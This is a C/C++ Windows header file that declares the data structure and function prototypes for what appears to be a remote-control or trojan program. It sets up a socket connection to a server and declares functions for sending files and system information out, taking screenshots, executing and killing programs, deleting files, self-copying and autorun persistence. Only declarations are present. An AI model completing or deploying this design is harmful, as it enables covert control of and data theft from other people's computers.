#pragma once
#include <Windows.h>
#include <stdio.h>
#include <conio.h>
#include <tchar.h>
#include <mmsystem.h>
#include <windows.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include<process.h>
#include <iostream>
#include <WinUser.h>

#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "mswsock.lib")
#pragma comment (lib,"WinMM.Lib")
 
#define STRLENN(x) (sizeof(x)/sizeof(TCHAR) - 1)
using namespace std;
struct Data
{
	char PCName[30], ServerName[30], Massage[200],TaskName[255];
	WSADATA WSADat;
	SOCKADDR_IN sin;
	SOCKET Sock,Server;
};
void CreatSocketAndConnect(struct Data *data);
void Menu(struct Data *data);
void CloseConnect(struct Data *data);
void RebootPC();
void ShutDownPC();
void ExitSystemePC();
void OpenCD_ROM();
void CreatFile(char str[],struct Data *data);
void DelFile(char path[],struct Data *data);
void WorkWithCursor(struct Data *data);
void sendFileFunction(char path[],struct Data *data);
void sendInformationSysteme(struct Data *data);
void GetInfoAboutWindows(struct Data *data);
void Execute(char path[]);
void CloseProgramm(char name[]);
void ShowFiles(struct Data *data);
void MkScreen(char path[], struct Data *data);
void CPY(char path[]);
BOOL SelfAutorun();